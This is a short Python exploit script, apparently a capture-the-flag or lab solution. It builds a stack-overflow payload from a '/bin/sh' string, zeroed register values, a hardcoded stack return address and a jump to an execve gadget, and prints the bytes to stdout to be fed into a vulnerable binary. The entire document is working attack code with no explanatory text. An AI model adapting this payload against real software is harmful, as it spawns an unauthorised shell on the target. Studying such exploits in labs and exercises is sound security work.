#!/usr/bin/env python3

import sys

shellcode = b'\x90' + b'\x90' + b'/bin/sh' + b'\x00'
redirect_to_shellcode = 0x7ffffff6a150.to_bytes(8, "little")
set_rsi = b'\x00' * 8
set_rdx = b'\x00' * 8
padding = b'\x00' * 8
jump_to_execve = 0x0000000000401e21.to_bytes(8, "little")

payload = shellcode + set_rsi  + set_rdx + redirect_to_shellcode + padding + jump_to_execve

sys.stdout.buffer.write(payload)
